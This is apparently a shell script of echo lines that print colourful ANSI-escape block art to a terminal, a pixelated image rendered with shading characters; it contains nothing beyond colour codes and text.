[38;5;220;48;5;230m [38;5;220;48;5;230m [38;5;221;48;5;229m [38;5;172;48;5;223m [38;5;222;48;5;223m [38;5;130;48;5;222m [38;5;166;48;5;223m [38;5;166;48;5;216m [38;5;130;48;5;222m [38;5;208;48;5;222m [38;5;202;48;5;216m [38;5;166;48;5;180m▒[38;5;166;48;5;180m▒[38;5;173;48;5;236m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;166;48;5;101m▓[38;5;173;48;5;95m▓[38;5;209;48;5;181m▓[38;5;166;48;5;223m▒[38;5;216;48;5;217m [38;5;166;48;5;223m [38;5;172;48;5;223m [38;5;172;48;5;223m [38;5;130;48;5;223m [38;5;130;48;5;222m [38;5;172;48;5;223m [38;5;130;48;5;222m [38;5;166;48;5;222m [38;5;166;48;5;223m [38;5;166;48;5;216m [38;5;223;48;5;222m [38;5;130;48;5;223m [38;5;223;48;5;223m [38;5;222;48;5;223m [38;5;223;48;5;223m [38;5;222;48;5;223m [38;5;94;48;5;223m [38;5;222;48;5;223m [38;5;172;48;5;223m [38;5;223;48;5;223m [38;5;223;48;5;223m [38;5;208;48;5;223m [38;5;214;48;5;223m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;202;48;5;216m [38;5;166;48;5;216m░[38;5;173;48;5;223m░[38;5;173;48;5;137m▓[38;5;202;48;5;52m░[38;5;69;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;92;48;5;96m▓[38;5;209;48;5;203m░[38;5;173;48;5;137m▓[38;5;173;48;5;180m▒[38;5;209;48;5;174m▒[38;5;202;48;5;216m [38;5;130;48;5;222m [38;5;222;48;5;223m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;223;48;5;222m [38;5;208;48;5;222m [38;5;172;48;5;223m [38;5;208;48;5;223m [38;5;202;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;208;48;5;223m [38;5;221;48;5;230m [38;5;222;48;5;223m [38;5;94;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;94;48;5;230m [38;5;166;48;5;223m [38;5;202;48;5;216m [38;5;166;48;5;223m [38;5;202;48;5;216m [38;5;202;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;130;48;5;222m [38;5;223;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;202;48;5;216m [38;5;202;48;5;216m░[38;5;209;48;5;180m▒[38;5;202;48;5;138m▒[38;5;202;48;5;238m▒[38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;160;48;5;160m [38;5;209;48;5;131m▒[38;5;209;48;5;137m▓[38;5;202;48;5;173m▒[38;5;202;48;5;216m [38;5;202;48;5;223m [38;5;172;48;5;223m [38;5;130;48;5;223m [38;5;130;48;5;223m [38;5;172;48;5;223m [38;5;214;48;5;229m [38;5;172;48;5;223m [38;5;130;48;5;224m [38;5;130;48;5;223m [38;5;94;48;5;229m [38;5;223;48;5;223m [38;5;172;48;5;224m [38;5;230;48;5;230m [38;5;220;48;5;230m [38;5;136;48;5;230m [38;5;130;48;5;223m [38;5;166;48;5;223m [38;5;172;48;5;230m [38;5;94;48;5;230m [38;5;221;48;5;230m [38;5;214;48;5;230m [38;5;172;48;5;223m [38;5;166;48;5;222m [38;5;130;48;5;223m [38;5;166;48;5;222m [38;5;202;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;216;48;5;216m [38;5;202;48;5;173m▒[38;5;173;48;5;137m▓[38;5;173;48;5;95m▓[38;5;209;48;5;95m▓[38;5;19;48;5;19m [38;5;172;48;5;230m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;209;48;5;166m░[38;5;209;48;5;167m▒[38;5;209;48;5;173m▒[38;5;209;48;5;216m░[38;5;223;48;5;223m [38;5;130;48;5;223m [38;5;208;48;5;223m [38;5;172;48;5;223m [38;5;223;48;5;222m [38;5;166;48;5;216m [38;5;173;48;5;173m▒[38;5;173;48;5;167m▒[38;5;173;48;5;137m▒[38;5;173;48;5;131m▒[38;5;209;48;5;131m▒[38;5;209;48;5;167m▒[38;5;209;48;5;210m [38;5;202;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;210m░[38;5;209;48;5;216m░[38;5;216;48;5;216m░[38;5;166;48;5;223m [38;5;208;48;5;222m [38;5;222;48;5;223m [38;5;223;48;5;222m [38;5;202;48;5;216m [38;5;166;48;5;216m [38;5;202;48;5;216m [38;5;202;48;5;216m [38;5;173;48;5;173m░[38;5;202;48;5;137m▒[38;5;166;48;5;95m▒[38;5;209;48;5;131m▒[38;5;209;48;5;167m░[38;5;209;48;5;202m░[38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;69;48;5;25m░[38;5;209;48;5;167m░[38;5;209;48;5;130m░[38;5;216;48;5;216m [38;5;202;48;5;216m [38;5;202;48;5;217m [38;5;173;48;5;173m░[38;5;173;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;167;48;5;130m▒[38;5;52;48;5;52m [38;5;52;48;5;52m [38;5;52;48;5;52m [38;5;209;48;5;1m░[38;5;209;48;5;130m░[38;5;209;48;5;130m░[38;5;209;48;5;167m▒[38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;209m [38;5;209;48;5;167m░[38;5;209;48;5;130m▒[38;5;209;48;5;130m░[38;5;209;48;5;88m░[38;5;209;48;5;88m░[38;5;209;48;5;94m░[38;5;209;48;5;131m▒[38;5;209;48;5;131m▒[38;5;209;48;5;167m▒[38;5;173;48;5;173m░[38;5;202;48;5;216m░[38;5;202;48;5;216m [38;5;202;48;5;216m [38;5;202;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;173m▒[38;5;173;48;5;95m▒[38;5;173;48;5;131m▒[38;5;209;48;5;167m░[38;5;209;48;5;203m░[38;5;203;48;5;203m░[38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;209;48;5;224m [38;5;216;48;5;216m [38;5;202;48;5;216m [38;5;166;48;5;223m [38;5;166;48;5;223m [38;5;216;48;5;216m [38;5;209;48;5;209m░[38;5;209;48;5;131m▒[38;5;209;48;5;131m▒[38;5;131;48;5;131m▒[38;5;95;48;5;236m▓[38;5;16;48;5;16m▓[38;5;52;48;5;232m [38;5;1;48;5;52m░[38;5;88;48;5;88m░[38;5;209;48;5;88m░[38;5;209;48;5;1m░[38;5;216;48;5;209m░[38;5;209;48;5;209m░[38;5;216;48;5;209m [38;5;209;48;5;130m▒[38;5;209;48;5;88m░[38;5;209;48;5;88m░[38;5;1;48;5;1m [38;5;174;48;5;94m▒[38;5;167;48;5;1m▒[38;5;209;48;5;94m▒[38;5;174;48;5;131m▒[38;5;1;48;5;1m [38;5;209;48;5;130m▒[38;5;173;48;5;130m░[38;5;173;48;5;167m▒[38;5;216;48;5;216m░[38;5;202;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m░[38;5;209;48;5;131m▒[38;5;209;48;5;130m░[38;5;209;48;5;167m░[38;5;209;48;5;167m░[38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;216;48;5;223m [38;5;216;48;5;209m░[38;5;166;48;5;223m [38;5;202;48;5;216m [38;5;172;48;5;223m [38;5;166;48;5;216m [38;5;166;48;5;223m [38;5;166;48;5;223m [38;5;216;48;5;217m [38;5;209;48;5;217m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;167;48;5;173m░[38;5;209;48;5;131m▒[38;5;209;48;5;167m▒[38;5;167;48;5;130m▒[38;5;209;48;5;131m▒[38;5;209;48;5;209m░[38;5;202;48;5;216m [38;5;209;48;5;209m [38;5;209;48;5;94m░[38;5;209;48;5;131m▒[38;5;88;48;5;88m░[38;5;174;48;5;131m▒[38;5;174;48;5;131m▒[38;5;52;48;5;233m [38;5;131;48;5;131m▒[38;5;167;48;5;167m░[38;5;209;48;5;167m▒[38;5;209;48;5;131m▒[38;5;173;48;5;173m▒[38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;202;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;216m░[38;5;209;48;5;167m▒[38;5;209;48;5;167m░[38;5;209;48;5;209m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;69;48;5;61m▒[38;5;172;48;5;223m [38;5;216;48;5;216m [38;5;209;48;5;216m [38;5;202;48;5;217m [38;5;166;48;5;223m [38;5;223;48;5;223m [38;5;166;48;5;223m [38;5;202;48;5;223m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;166;48;5;223m [38;5;166;48;5;223m [38;5;216;48;5;216m [38;5;209;48;5;209m [38;5;209;48;5;209m░[38;5;167;48;5;167m▒[38;5;167;48;5;209m░[38;5;209;48;5;210m░[38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;223;48;5;223m [38;5;166;48;5;223m [38;5;166;48;5;223m [38;5;202;48;5;216m [38;5;209;48;5;216m░[38;5;209;48;5;216m [38;5;209;48;5;209m [38;5;202;48;5;216m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;223m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;166;48;5;223m [38;5;223;48;5;223m [38;5;130;48;5;223m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;209m [38;5;216;48;5;216m [38;5;216;48;5;217m [38;5;166;48;5;223m [38;5;166;48;5;216m [38;5;216;48;5;216m [38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;216;48;5;216m░[38;5;209;48;5;209m░[38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;138;48;5;138m▓[38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;210m [38;5;209;48;5;210m [38;5;209;48;5;210m [38;5;209;48;5;209m [38;5;209;48;5;203m░[38;5;167;48;5;167m▒[38;5;216;48;5;223m [38;5;130;48;5;223m [38;5;172;48;5;230m [38;5;130;48;5;224m [38;5;202;48;5;223m [38;5;209;48;5;216m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;210m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m [38;5;216;48;5;216m░[38;5;216;48;5;216m [38;5;99;48;5;60m▓[38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m [38;5;19;48;5;19m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;203;48;5;203m░[38;5;216;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;210m [38;5;209;48;5;210m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;167m░[38;5;209;48;5;130m░[38;5;209;48;5;223m [38;5;223;48;5;223m [38;5;166;48;5;223m [38;5;208;48;5;224m [38;5;166;48;5;223m [38;5;216;48;5;223m [38;5;209;48;5;216m [38;5;216;48;5;216m [38;5;209;48;5;124m░[38;5;209;48;5;167m░[38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;209;48;5;210m [38;5;209;48;5;209m [38;5;209;48;5;209m [38;5;216;48;5;215m [38;5;216;48;5;209m░[38;5;209;48;5;173m░[38;5;173;48;5;173m░[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;216;48;5;216m░[38;5;209;48;5;210m░[38;5;209;48;5;173m░[38;5;216;48;5;216m [38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;209m [38;5;209;48;5;203m░[38;5;209;48;5;203m░[38;5;209;48;5;209m [38;5;203;48;5;209m░[38;5;167;48;5;131m▒[38;5;174;48;5;167m▒[38;5;167;48;5;209m░[38;5;209;48;5;209m [38;5;209;48;5;210m [38;5;209;48;5;209m░[38;5;209;48;5;167m░[38;5;167;48;5;167m▒[38;5;167;48;5;167m░[38;5;209;48;5;167m▒[38;5;209;48;5;167m░[38;5;209;48;5;203m░[38;5;209;48;5;203m░[38;5;209;48;5;167m░[38;5;209;48;5;209m░[38;5;209;48;5;167m░[38;5;209;48;5;167m░[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;209m░[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;209;48;5;173m░[38;5;216;48;5;209m░[38;5;173;48;5;209m░[38;5;173;48;5;173m░[38;5;209;48;5;210m░[38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;209m░[38;5;209;48;5;210m [38;5;209;48;5;209m░[38;5;209;48;5;216m [38;5;209;48;5;209m░[38;5;209;48;5;173m▒[38;5;174;48;5;131m▒[38;5;209;48;5;88m░[38;5;209;48;5;88m░[38;5;209;48;5;131m▒[38;5;209;48;5;167m▒[38;5;167;48;5;167m░[38;5;203;48;5;209m [38;5;203;48;5;203m░[38;5;209;48;5;167m░[38;5;209;48;5;167m░[38;5;209;48;5;167m░[38;5;209;48;5;173m░[38;5;209;48;5;167m░[38;5;209;48;5;167m▒[38;5;173;48;5;167m▒[38;5;173;48;5;173m░[38;5;209;48;5;173m░[38;5;209;48;5;173m░[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;173;48;5;173m▒[38;5;209;48;5;209m░[38;5;173;48;5;173m░[38;5;209;48;5;173m░[38;5;209;48;5;173m░[38;5;209;48;5;131m▒[38;5;209;48;5;130m▒[38;5;209;48;5;167m▒[38;5;209;48;5;173m▒[38;5;209;48;5;210m [38;5;209;48;5;210m 